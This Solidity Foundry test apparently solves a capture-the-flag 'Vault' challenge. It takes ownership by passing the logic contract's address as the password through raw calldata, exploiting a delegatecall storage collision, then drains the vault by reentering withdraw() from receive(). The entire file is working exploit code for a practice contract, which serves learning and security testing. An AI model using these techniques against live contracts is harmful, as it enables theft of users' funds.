// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address hacker = address(this);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        // Use password to change owner
        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
        bytes32 password = bytes32(uint256(uint160(address(logic))));

        bytes memory callData = abi.encodePacked(
            selector,
            password,
            uint256(uint160(hacker))
        );

        (bool success, ) = address(vault).call(callData);
        assertEq(vault.owner(), hacker);

        // Withdraw function need to be open first
        vault.openWithdraw();
        // deposite 0.01 ether will tigger the attack in receive callback
        vault.deposite{value: 0.01 ether}();
        console2.log("vault balance before attack:", address(vault).balance);

        vault.withdraw();
        console2.log("vault balance after attack:", address(vault).balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
    receive() external payable {
        vault.withdraw();
    }
}
